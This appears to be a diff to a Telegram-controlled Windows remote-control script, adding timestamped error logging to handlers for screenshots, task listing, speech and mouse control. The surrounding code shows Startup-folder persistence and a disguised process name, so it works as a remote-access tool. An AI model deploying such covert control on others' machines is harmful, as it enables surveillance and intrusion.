@@ -32,6 +32,8 @@ from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from pyautogui import leftClick, center, locateOnScreen
+from datetime import datetime
+import pytz
 
 fname = 'mscer' + os.path.splitext(os.path.basename(sys.argv[0]))[1]
 
@@ -421,7 +423,13 @@ def screen(command):
             screen.close()
             os.remove('C:\\ProgramData\\Screenshot.jpg')
         except Exception as e:
-            bot.send_message(e)
+            try:
+                log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+                log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({command.chat.id}) {command.chat.username} Написал - {command.text}\n\nОшибка:\n{e}")
+                log.close()
+                bot.send_message(command.chat.id, str(e))
+            except:
+                pass
 
 @bot.message_handler(commands=['Webcam', 'webcam'])
 def webcam(command):
@@ -1414,8 +1422,12 @@ def tasklist(command):
             bot.send_document(command.chat.id, tasklist)
             tasklist.close()
             os.remove('C:\\ProgramData\\Tasklist.txt')
-        except:
-            pass
+        except Exception as e:
+            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),
+                       "a")
+            log.write(
+                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({command.chat.id}) {command.chat.username} Написал - {command.text}\n\nОшибка:\n{e}")
+            log.close()
 
 @bot.message_handler(commands=['Taskkill', 'taskkill'])
 def taskkill(message):
@@ -1513,8 +1525,12 @@ def say(message):
             speaker.Speak(user_msg.split("/Say")[1])
             del speaker
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
-        except:
-            pass
+        except Exception as e:
+            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),
+                       "a")
+            log.write(
+                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+            log.close()
 
 @bot.message_handler(commands=['say'])
 def say(message):
@@ -1532,8 +1548,12 @@ def say(message):
             speaker.Speak(user_msg.split("/say")[1])
             del speaker
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
-        except:
-            pass
+        except Exception as e:
+            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),
+                       "a")
+            log.write(
+                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+            log.close()
 
 
 @bot.message_handler(commands=['Mouse', 'mouse'])
@@ -1541,8 +1561,12 @@ def mouse(message):
     if message.chat.id in adm:
         try:
             bot.send_message(message.chat.id, '. . .', parse_mode="Markdown", reply_markup=main15)
-        except:
-            pass
+        except Exception as e:
+            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),
+                       "a")
+            log.write(
+                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+            log.close()
 
 
 @bot.message_handler(commands=['LeftClick', 'leftclick', 'click', 'Click', 'lc'])
@@ -1551,8 +1575,10 @@ def leftclick(message):
         try:
             pyautogui.leftClick()
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
-        except:
-            pass
+        except Exception as e:
+            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+            log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+            log.close()
 
 
 @bot.message_handler(commands=['RightClick', 'rightclick', 'rc'])
@@ -1561,8 +1587,10 @@ def rightclick(message):
         try:
             pyautogui.rightClick()
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
-        except:
-            pass
+        except Exception as e:
+            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+            log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+            log.close()
 
 
 @bot.message_handler(commands=['LeftDoubleClick', 'leftdoubleclick', 'ldc'])
@@ -1571,8 +1599,10 @@ def leftdoubleclick(message):
         try:
             pyautogui.doubleClick(button="left")
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
-        except:
-            pass
+        except Exception as e:
+            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+            log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+            log.close()
 
 
 @bot.message_handler(commands=['MiddleClick', 'middleclick', 'mc'])
@@ -1581,8 +1611,10 @@ def middleclick(message):
         try:
             pyautogui.middleClick()
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
-        except:
-            pass
+        except Exception as e:
+            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+            log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+            log.close()
 
 
 @bot.message_handler(commands=['RightHold', 'righthold', 'rh'])
@@ -1593,8 +1625,10 @@ def righthold(message):
             time.sleep(2)
             pyautogui.mouseUp(button="right")
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
-        except:
-            pass
+        except Exception as e:
+            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+            log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+            log.close()
 
 
 @bot.message_handler(commands=['AutoAcceptOn', 'autoaccepton', 'acon'])
@@ -1610,14 +1644,16 @@ def autoaccepton(message):
                         try:
                             leftClick(center(locateOnScreen("c:/ProgramData/Files/Photos/ScreenAccept/"+i, confidence=0.9)))
                             bot.send_message(id, "Успешно принята игра")
-                            stopfunc = 0
+                            stopfunc = 1
                             break
                         except:
                             time.sleep(0.05)
             threading.Thread(target=func, args=(message.chat.id,)).start()
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
-        except:
-            pass
+        except Exception as e:
+            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+            log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+            log.close()
 
 
 @bot.message_handler(commands=['AutoAcceptOff', 'autoacceptoff', 'acoff'])
@@ -1627,8 +1663,10 @@ def autoaccepton(message):
         try:
             stopfunc = 1
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
-        except:
-            pass
+        except Exception as e:
+            log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'), "a")
+            log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+            log.close()
 
 
 @bot.message_handler(commands=['MoveMouse', 'movemouse', 'mm'])
@@ -1638,7 +1676,13 @@ def autoaccepton(message):
             pyautogui.moveTo(x=int(message.text.split()[1]), y=int(message.text.split()[2]))
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
         except Exception as e:
-            print(e)
+            try:
+                log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+                log.write(
+                    f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+                log.close()
+            except:
+                pass
 
 try:
     bot.polling(none_stop=True)
@@ -1650,8 +1694,15 @@ except:
         try:
             os.startfile(
                 'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.vbs')
-        except:
+        except Exception as e:
             stoper = 1
+            try:
+                log = open("ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M'),"a")
+                log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
+                log.close()
+            except:
+                pass
+            time.sleep(10)
     if stoper == 0:
         os.system('taskkill /f /im py.exe')
         exit()
